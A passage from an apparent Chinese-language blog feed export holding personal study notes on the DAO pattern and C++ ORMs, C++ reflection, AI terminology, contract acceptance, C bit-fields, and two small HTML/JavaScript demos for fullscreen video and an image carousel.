<h1 id="什么是-DAO"><a href="#什么是-DAO" class="headerlink" title="什么是 DAO"></a>什么是 DAO</h1><blockquote>
<p>在计算机软件中，数据访问对象（data access object，DAO）是为某种类型的数据库或其他持久性机制提供一个抽象接口的对象。通过映射应用程序对持久层的调用，DAO 提供一些特定的数据操作，而无需暴露数据库细节。这种隔离支持单一功能原则。</p>
</blockquote>
<blockquote>
<p>数据访问对象模式（Data Access Object Pattern）或 DAO 模式用于把低级的数据访问 API 或操作从高级的业务服务中分离出来。</p>
</blockquote>
<p>数据访问对象模式的参与者主要有:</p>
<ul>
<li>数据访问对象接口（Data Access Object Interface） - 该接口定义了在一个模型对象上要执行的标准操作。</li>
<li>数据访问对象实体类（Data Access Object concrete class） - 该类实现了上述的接口。该类负责从数据源获取数据，数据源可以是数据库，也可以是 xml，或者是其他的存储机制。</li>
<li>模型对象/数值对象（Model Object/Value Object, VO） - 该对象是简单的 POJO，包含了 get/set 方法来存储通过使用 DAO 类检索到的数据。</li>
</ul>
<h1 id="主流的-ORM-框架"><a href="#主流的-ORM-框架" class="headerlink" title="主流的 ORM 框架"></a>主流的 ORM 框架</h1><p>C++ 中主流的 ORM 框架有以下几个：</p>
<ul>
<li>LiteSQL：<a href="https://sourceforge.net/projects/litesql/" target="_blank" rel="noopener">https://sourceforge.net/projects/litesql/</a></li>
<li>ODB：<a href="https://www.codesynthesis.com/products/odb/" target="_blank" rel="noopener">https://www.codesynthesis.com/products/odb/</a></li>
<li>QxOrm：<a href="https://www.qxorm.com/qxorm_en/home.html" target="_blank" rel="noopener">https://www.qxorm.com/qxorm_en/home.html</a></li>
<li>Wt::Dbo：<a href="https://www.webtoolkit.eu/wt/doc/tutorial/dbo.html" target="_blank" rel="noopener">https://www.webtoolkit.eu/wt/doc/tutorial/dbo.html</a></li>
</ul>
<p>其中，LiteSQL 和 ODB 不依赖于特定的框架，而 QxOrm 依赖于 Qt，Wt::Dbo 依赖于 Wt。由于使用QT进行开发，最终决定使用QxOrm。本想使用QDB，但是在QT上开发太麻烦。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://hjk.life/posts/cpp-dao/" target="_blank" rel="noopener">C++实现的DAO(数据访问对象模式)</a>,by Jinkai.</li>
<li><a href="https://www.ljjyy.com/archives/2023/05/100647" target="_blank" rel="noopener">QxOrm使用教程(ORM for C++ 对象关系映射)</a>,by ljjyy.</li>
<li><a href="https://www.cnblogs.com/sun-frederick/p/4762972.html" target="_blank" rel="noopener">浅谈C++三层架构</a>,by eric0803.</li>
<li><a href="https://qt.video/index.php?m=home&c=View&a=index&aid=296" target="_blank" rel="noopener">C++架构之美：设计卓越应用</a>,by qt.video.</li>
<li><a href="https://www.cnblogs.com/zhangxiong-tianxiadiyi/p/10896413.html" target="_blank" rel="noopener">Dao层设计</a>,by c++天下第一.</li>
<li><a href="https://bot-man-jl.github.io/articles/?post=2016/How-to-Design-a-Naive-Cpp-ORM" target="_blank" rel="noopener">如何设计一个简单的 C++ ORM</a>,by bot-man-jl.</li>
<li><a href="https://developer.aliyun.com/article/243125" target="_blank" rel="noopener">C++ ORM ODB入门</a>,by aliyun.</li>
<li><a href="https://www.jianshu.com/p/4e955d24facb" target="_blank" rel="noopener">TinyORM：一个简单的C++ ORM框架</a>,by davidpp.</li>
<li><a href="https://www.cnblogs.com/hul201610101100/p/9482311.html" target="_blank" rel="noopener">C++版本 ORM 访问数据库之ODB 的Window环境编译(一)</a>,by Software_hul.</li>
<li><a href="https://blog.csdn.net/u011057439/article/details/79414886" target="_blank" rel="noopener">Windows下Qt5.5.1中使用ODB</a>,by 严慈善.</li>
<li><a href="https://www.cnblogs.com/lidabo/p/7545508.html" target="_blank" rel="noopener">【一】ODB - C++ 访问数据库的利器–Hello World On Windows（Version-24）</a>,by C++程序员Carea.</li>
<li><a href="https://blog.csdn.net/qq_33221533/article/details/103410282" target="_blank" rel="noopener">error LNK2001: 无法解析的外部符号 “__declspec(dllimport) public 解决办法</a>,by 鸡啄米的时光机.</li>
<li><a href="https://www.qxorm.com/qxorm_en/tutorial.html" target="_blank" rel="noopener">qxBlog project - blog management in C++</a>,by QxOrm.</li>
<li><a href="https://blog.csdn.net/weixin_40949133/article/details/105809268" target="_blank" rel="noopener">Qt三层架构应用程序设计及开发</a>,by wyh20171105.</li>
<li><a href="https://www.cnblogs.com/cps666/p/17341147.html" target="_blank" rel="noopener">Qt项目架构经验总结</a>,by cps666.</li>
<li><a href="https://www.cnblogs.com/ybqjymy/p/14366629.html" target="_blank" rel="noopener">Qt SQL的使用 MySQL</a>,by 一杯清酒邀明月.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>软件架构</tag>
      </tags>
  </entry>
  <entry>
    <title>CPlusPlus反射机制研究</title>
    <url>/2024/07/21/CPlusPlus%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>反射是指在程序运行时，动态获取类或对象的所有属性和方法。这种语言的反射机制可以提高程序设计的通用性和便利性。但遗憾的是，当前C++标准不支持反射机制。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/duan19920101/article/details/127557454" target="_blank" rel="noopener">C++ 反射机制（实例讲解）</a>,by 那年聪聪.</li>
<li><a href="https://blog.csdn.net/q1007729991/article/details/56012253" target="_blank" rel="noopener">C++ 实现反射机制</a>,by –Allen–.</li>
<li><a href="https://blog.csdn.net/mogoweb/article/details/79264925" target="_blank" rel="noopener">[C++11札记]： type traits简介</a>,by 云水木石.</li>
<li><a href="https://juejin.cn/post/7209967260898000954" target="_blank" rel="noopener">重大变更（一）：关于C++26的十大猜想</a>,by 极客时间APP.</li>
<li><a href="https://juejin.cn/post/7112307334004604965" target="_blank" rel="noopener">C++ type traits的学习</a>,by 燃脂二师兄.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>人工智能领域术语学习笔记</title>
    <url>/2024/07/31/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E9%A2%86%E5%9F%9F%E6%9C%AF%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>记录学习一些人工智能领域的专业名词含义，方便理解。</p>
<h1 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h1><p>1956年夏天，计算机科学家约翰·麦卡锡（John McCarthy）首次提出”人工智能”（AI）这个概念。</p>
<p>人工智能指的是，通过软件和硬件，来完成通常需要人类智能才能完成的任务。它的研究对象，就是在机器上模拟人类智能。</p>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>早期，人工智能研究分成两个阵营。</p>
<p>第一个阵营是规则式（rule-based）方法，又称专家系统（expert systems），指的是人类写好一系列逻辑规则，来教导计算机如何思考。</p>
<p>可想而知，对于复杂的、大规模的现实问题，很难写出完备的、明确的规则。所以，这种方法的进展一直很有限。</p>
<p>第二个阵营就是机器学习（machine learning），指的是没有预置的规则，只是把材料提供给计算机，让机器通过自我学习，自己发现规则，给出结果。</p>
<h1 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h1><p>神经网络（neural network）是机器学习的一种主要形式。</p>
<p>神经网络就是在机器上模拟人脑的结构，构建类似生物神经元的计算网络来处理信息。</p>
<p>一个计算节点就是一个神经元，大量的计算节点组成网络，进行协同计算。</p>
<p>神经网络需要极大的算力，以及海量的训练材料。以前，这是难以做到的，所以20世纪70年代开始，就陷入了停滞，长期没有进展。</p>
<h1 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h1><p>深度学习是神经网络的一种实现方法，在20世纪80年代由杰弗里·辛顿提出。它让神经网络研究重新复活。</p>
<p>深度学习是一种让多层神经元可以进行有效计算的方法，大大提高了神经网络的性能。”深度学习”这个名字，就是比喻多层神经元的自主学习过程。</p>
<p>多层神经元包括一个输入层和一个输出层，它们之间有很多中间层（又称隐藏层）。以前，计算机算力有限，只能支撑一两个中间层，深度学习使得我们可以构建成千上万个中间层的网络，具有极大的”深度”。</p>
<h1 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h1><p>早些年，深度学习用到的方法是卷积神经网络（CNN）和循环神经网络（RNN）。</p>
<p>2017年，谷歌的研究人员发明了一种新的深度学习处理方法，叫做 Transformer（转换器）。</p>
<p>Transformer 不同于以前的方法，不再一个个处理输入的单词，而是一次性处理整个输入，对每个词分配不同的权重。</p>
<p>这种方法直接导致了2022年 ChatGPT 和后来无数生成式 AI 模型的诞生，是神经网络和深度学习目前的主流方法。</p>
<p>由于基于 Transformer 的模型需要一次性处理整个输入，所以都有”上下文大小”这个指标，指的是一次可以处理的最大输入。</p>
<p>比如，GPT-4 Turbo 的上下文是 128k 个 Token，相当于一次性读取超过300页的文本。上下文越大，模型能够考虑的信息就越多，生成的回答也就越相关和连贯，相应地，所需要的算力也就越多。</p>
<h1 id="Token-词元"><a href="#Token-词元" class="headerlink" title="Token 词元"></a>Token 词元</h1><p>Token，也称为标记或词元，是语言处理中的一个基本单元。它通常代表一个单词、标点符号或一个特定的符号序列。Token是文本的基本组成单元，用于表示文本中的有意义的语言元素。例如，“Hello, world!”这个句子可以被划分为多个Token：“Hello”、“,”、“world”和“!”。</p>
<h1 id="深度学习成为当今显学的原因"><a href="#深度学习成为当今显学的原因" class="headerlink" title="深度学习成为当今显学的原因"></a>深度学习成为当今显学的原因</h1><p>深度学习成为当今显学的主要原因是性能优越。实际上深度学习的基础技术几十年前就已经提出来了，那为什么最近十多年深度学习才开始火热？这主要是制约深度学习的两大因素：大数据集和高性能硬件在十多年前才达到深度学习的门槛。大数据集使深度学习能够充分的进行训练，而高性能硬件如CPU和GPU使深度学习的训练速度以指数级提升。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developer.baidu.com/article/details/2736405" target="_blank" rel="noopener">自然语言处理中的文本token和tokenization详解</a>,by KAKAKA.</li>
<li><a href="https://github.com/Yunhui1998/Deep-Learning-Tutorial/blob/main/1%20%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D.md" target="_blank" rel="noopener">深度学习基础介绍</a>,by Yunhui1998.</li>
<li><a href="https://medium.com/@vincentlambert0/it-all-started-with-a-perceptron-86bd0fb80b96" target="_blank" rel="noopener">It all started with a Perceptron</a>,by Vincent.</li>
<li><a href="https://www.ruanyifeng.com/blog/2024/12/weekly-issue-330.html" target="_blank" rel="noopener">科技爱好者周刊（第 330 期）：李开复梳理人工智能</a>,by 阮一峰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>合同管理知识学习笔记</title>
    <url>/2024/08/23/%E5%90%88%E5%90%8C%E7%AE%A1%E7%90%86%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>项目采购管理过程围绕合同进行，采购管理过程所涉及的各种活动过程了合同生命周期。</p>
<h1 id="合同类型"><a href="#合同类型" class="headerlink" title="合同类型"></a>合同类型</h1><p>按项目范围分：</p>
<ul>
<li>项目总承包合同</li>
<li>项目单项承包合同</li>
<li>项目分包合同</li>
</ul>
<p>按项目付款方式划分：</p>
<ul>
<li>总价合同</li>
<li>成本补偿合同</li>
<li>工料合同</li>
</ul>
<h1 id="合同管理过程"><a href="#合同管理过程" class="headerlink" title="合同管理过程"></a>合同管理过程</h1><h2 id="合同的签订管理"><a href="#合同的签订管理" class="headerlink" title="合同的签订管理"></a>合同的签订管理</h2><h2 id="合同的履行管理"><a href="#合同的履行管理" class="headerlink" title="合同的履行管理"></a>合同的履行管理</h2><p>工程验收的基本流程通常包括<strong>预验收、初步验收和最终验收</strong>三个阶段。在预验收阶段，施工单位需要自查自纠，确保工程各项指标符合设计要求和施工规范。初步验收则是在预验收的基础上，由建设单位组织设计、监理等相关部门共同参与，对工程质量进行全面检查。最终验收是在初步验收合格后，经过一段时间的试运行，确认工程无重大问题后进行的正式验收。</p>
<p>有幸作为专家参加一个合同的最终验收，记录一下最终验收的具体流程：</p>
<ul>
<li>建设方项目介绍</li>
<li>承建方和监理方介绍预验收或初步验收之后存在的问题和整改情况</li>
<li>专家组现场查看项目建设成果</li>
<li>专家组评审项目材料，查漏补缺（因评审时间有限，重点对评审材料的完备性和科学性进行审查）</li>
<li>专家组出具评审意见</li>
</ul>
<h2 id="合同的变更管理"><a href="#合同的变更管理" class="headerlink" title="合同的变更管理"></a>合同的变更管理</h2><h2 id="合同的档案管理"><a href="#合同的档案管理" class="headerlink" title="合同的档案管理"></a>合同的档案管理</h2><h2 id="合同违约索赔管理"><a href="#合同违约索赔管理" class="headerlink" title="合同违约索赔管理"></a>合同违约索赔管理</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://book.douban.com/subject/36318985/" target="_blank" rel="noopener">信息系统项目管理师教程（第4版）</a>,by douban.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>项目管理</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言中的位域使用方法</title>
    <url>/2024/09/18/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E4%BD%8D%E5%9F%9F%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>C语言中的位域（Bit-fields）可以用于对结构体成员进行位级别的控制和优化。在一些应用中，比如网络协议，经常会涉及对数据的某些比特位进行操作，尽管可以使用位的相关运算，但是C语言提供了位域用以支持对一个字节的某几个位进行访问，操作起来也更加方便。</p>
</blockquote>
<h1 id="位域的定义与引用"><a href="#位域的定义与引用" class="headerlink" title="位域的定义与引用"></a>位域的定义与引用</h1><blockquote>
<p>位域不同于一般的结构体成员，它以位为单位来定义成员的长度，因此在结构体中定义位域时，必须要指明位域成员所需要占用的二进制位数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct MsgHeader &#123;</span><br><span class="line">    int a: 5;   &#x2F;&#x2F; 数据类型名    变量名：二进制位数</span><br><span class="line">    int b: 3;</span><br><span class="line">    int c: 2;</span><br><span class="line">    int d：6;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于位域本质上是一种特殊的结构体成员，因此一般结构体成员的引用方法同样适用于位域成员。不过，需要特别注意的是，位域成员存储是以二进制位作为单位的，而内存的最小寻址单元是字节，所以不能直接引用位域成员的地址。</p>
<h1 id="位域与大小端"><a href="#位域与大小端" class="headerlink" title="位域与大小端"></a>位域与大小端</h1><blockquote>
<p>结构体内位域成员在大小端系统上的内存分配规则如下：</p>
</blockquote>
<ul>
<li>无论是大端或小端模式，位域的存储都是由内存低地址向高地址分配，即从低地址字节的低位bit开始向高地址字节的高位bit分配空间；</li>
<li>位域成员在已分配的内存区域内，按照机器定义的比特序对数据的各个bit位进行排列。即在小端模式中，位域成员的最低有效位存放在内存低bit位，最高有效位存放在内存高bit位；大端模式则相反。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/636551863" target="_blank" rel="noopener">C语言中位域（Bit-fields）的高级玩法，8个案例代码告诉你怎么玩</a>,by<br>晓亮Albert.</li>
<li><a href="https://www.cnblogs.com/Aspiresky/p/15780975.html" target="_blank" rel="noopener">C语言结构体位域及其存储</a>,by Aspiresky.</li>
<li><a href="https://zhuanlan.zhihu.com/p/635530873" target="_blank" rel="noopener">3分钟理解C语言结构体位域（小白扫盲篇）</a>,by 天黑黑.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML视频点击自动最大化播放技术学习</title>
    <url>/2024/09/23/HTML%E8%A7%86%E9%A2%91%E7%82%B9%E5%87%BB%E8%87%AA%E5%8A%A8%E6%9C%80%E5%A4%A7%E5%8C%96%E6%92%AD%E6%94%BE%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>最近遇到一个小需求，就是在网页前端实现点击视频播放的同时，实现视频最大化，简单学习一下。</p>
<h1 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h1><p>网页前端实现点击视频播放的同时，实现视频最大化的技术原理如下：</p>
<ul>
<li>捕捉点击视频播放的事件，在该事件中执行视频最大化方法</li>
</ul>
<h1 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;Content-Type content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;视频技术测试&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        html, body &#123;</span><br><span class="line">            width:  100%;</span><br><span class="line">            height: 100%;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding:0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #max&#123;</span><br><span class="line">            margin: 5% auto;</span><br><span class="line">            width: 600px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;max&quot;&gt;</span><br><span class="line">        &lt;video id&#x3D;&quot;media&quot; controls width&#x3D;&quot;600&quot;&gt;</span><br><span class="line">            &lt;source src&#x3D;&quot;.&#x2F;media&#x2F;cc0-videos&#x2F;flower.webm&quot; type&#x3D;&quot;video&#x2F;webm&quot; &#x2F;&gt;</span><br><span class="line">          </span><br><span class="line">            &lt;source src&#x3D;&quot;.&#x2F;media&#x2F;cc0-videos&#x2F;flower.mp4&quot; type&#x3D;&quot;video&#x2F;mp4&quot; &#x2F;&gt;</span><br><span class="line">          </span><br><span class="line">            Download the</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;media&#x2F;cc0-videos&#x2F;flower.webm&quot;&gt;WEBM&lt;&#x2F;a&gt;</span><br><span class="line">            or</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;media&#x2F;cc0-videos&#x2F;flower.mp4&quot;&gt;MP4&lt;&#x2F;a&gt;</span><br><span class="line">            video.</span><br><span class="line">          &lt;&#x2F;video&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const video &#x3D; document.querySelector(&quot;#media&quot;);</span><br><span class="line"></span><br><span class="line">    video.addEventListener(&quot;play&quot;, (event) &#x3D;&gt; &#123;</span><br><span class="line">        video.requestFullscreen();</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_41786018/article/details/135844074" target="_blank" rel="noopener">深入理解HTML5视频标签：掌握全方位的播放控制和交互技巧</a>,by 未闻花名_review.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML图片自动轮播技术学习</title>
    <url>/2024/09/23/HTML%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E8%BD%AE%E6%92%AD%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>最近遇到一个小需求，就是在网页前端实现图片自动轮播，简单学习一下。</p>
<h1 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h1><p>网页前端实现图片自动轮播的技巧如下：</p>
<ul>
<li>图片所在容器元素采用绝对定位，从而实现所有图片叠加到一块。</li>
<li>通过CSS实现左右箭头</li>
<li>通过js调整图片所在容器的透明度，从而实现图片的轮播。同时调整播放顺序按钮的背景色，从而实现顺序指示的功能。</li>
</ul>
<h1 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;Content-Type content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;图片轮播技术测试&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 100%;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #max &#123;</span><br><span class="line">            width: 900px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            margin-top: 0%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .re &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .arrow &#123;</span><br><span class="line">            height: 20px;</span><br><span class="line">            width: 20px;</span><br><span class="line">            border: solid #333;</span><br><span class="line">            border-width: 0 4px 4px 0;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding: 3px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .left &#123;</span><br><span class="line">            transform: rotate(135deg);</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            margin-top: 240px;</span><br><span class="line">            margin-left: 20px;</span><br><span class="line">            float: left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .right &#123;</span><br><span class="line">            transform: rotate(-45deg);</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            margin-top: 240px;</span><br><span class="line">            margin-right: 10px;</span><br><span class="line">            float: right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .re ul &#123;</span><br><span class="line">            list-style-type: none;</span><br><span class="line">            padding: 0;</span><br><span class="line">            margin: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .re ul&gt;li &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            transition: 2s;</span><br><span class="line">            opacity: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .re ul&gt;li img &#123;</span><br><span class="line">            width: 900px;</span><br><span class="line">            height: 500px;</span><br><span class="line">            border-radius: 1%;</span><br><span class="line">            border: 5px solid #fffbd6;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #max ol &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            display: grid;</span><br><span class="line">            grid-template-columns: repeat(5, 75px);</span><br><span class="line">            grid-template-rows: auto;</span><br><span class="line">            grid-gap: 1em;</span><br><span class="line">            gap: 1em;</span><br><span class="line">            float: right;</span><br><span class="line">            margin-top: 450px;</span><br><span class="line">            list-style: none;</span><br><span class="line">            top: 0;</span><br><span class="line">            left: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #max ol li &#123;</span><br><span class="line">            width: 20px;</span><br><span class="line">            height: 20px;</span><br><span class="line">            font-size: 15px;</span><br><span class="line">            line-height: 20px;</span><br><span class="line">            float: left;</span><br><span class="line">            text-align: center;</span><br><span class="line">            border-radius: 2em;</span><br><span class="line">            border: 5px solid #999999;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;max&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;re&quot; onmouseover&#x3D;&quot;mouseover()&quot; onmouseout&#x3D;&quot;mouseout()&quot;&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">                &lt;li&gt;&lt;img src&#x3D;&quot;.&#x2F;pic&#x2F;big_size&#x2F;p1.jpg&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;img src&#x3D;&quot;.&#x2F;pic&#x2F;big_size&#x2F;p2.jpg&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;img src&#x3D;&quot;.&#x2F;pic&#x2F;big_size&#x2F;p3.jpg&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;img src&#x3D;&quot;.&#x2F;pic&#x2F;big_size&#x2F;p4.jpg&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;img src&#x3D;&quot;.&#x2F;pic&#x2F;big_size&#x2F;p5.jpg&quot; alt&#x3D;&quot;&quot;&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ul&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;arrow left&quot; onClick&#x3D;&quot;prev()&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;arrow right&quot; onClick&#x3D;&quot;next()&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">            &lt;ol&gt;</span><br><span class="line">                &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function fun(i, j) &#123;&#x2F;&#x2F;转换图片函数，就是把透明度改了一下</span><br><span class="line">        lik[i].style.opacity &#x3D; 1;</span><br><span class="line">        lik[j].style.opacity &#x3D; 0;</span><br><span class="line">        lik[i + 5].style.backgroundColor &#x3D; &quot;#ffffff&quot;;&#x2F;&#x2F;改一下小图标</span><br><span class="line">        lik[j + 5].style.backgroundColor &#x3D; &quot;#00000000&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function auto() &#123;&#x2F;&#x2F;轮播循环函数</span><br><span class="line">        if (++i &gt;&#x3D; 5) &#123;</span><br><span class="line">            i &#x3D; 0;</span><br><span class="line">            fun(0, 4);</span><br><span class="line">        &#125;</span><br><span class="line">        else fun(i, i - 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mouseover()&#123;</span><br><span class="line">        console.log(&#39;clear timer!&#39;);</span><br><span class="line">        clearInterval(timer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mouseout()&#123;</span><br><span class="line">        console.log(&#39;set timer!&#39;);</span><br><span class="line">        timer &#x3D; setInterval(auto, transition); &#x2F;&#x2F;调用定时器</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function prev()&#123;</span><br><span class="line">        if (--i &lt; 0) &#123;</span><br><span class="line">            i &#x3D; 4;</span><br><span class="line">            fun(4, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        else fun(i, i + 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function next()&#123;</span><br><span class="line">        if (++i &gt;&#x3D; 5) &#123;</span><br><span class="line">            i &#x3D; 0;</span><br><span class="line">            fun(0, 4);</span><br><span class="line">        &#125;</span><br><span class="line">        else fun(i, i - 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var transition &#x3D; 5000;</span><br><span class="line">    var box &#x3D; this.document.getElementsByClassName(&quot;re&quot;)[0];</span><br><span class="line">    var lik &#x3D; box.getElementsByTagName(&quot;li&quot;);</span><br><span class="line"></span><br><span class="line">    fun(0, 1);&#x2F;&#x2F;初始化下</span><br><span class="line">    var i &#x3D; 0;</span><br><span class="line">    </span><br><span class="line">    timer &#x3D; this.setInterval(auto, transition);</span><br><span class="line"></span><br><span class="line">    var j &#x3D; 0;</span><br><span class="line">    for (; j &lt; 5; j++) &#123;&#x2F;&#x2F;点击小图标也可以转换图片</span><br><span class="line">        lik[j + 5].ind &#x3D; j;</span><br><span class="line">        lik[j + 5].onclick &#x3D; function () &#123;</span><br><span class="line">            fun(this.ind, i)</span><br><span class="line">            i &#x3D; this.ind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
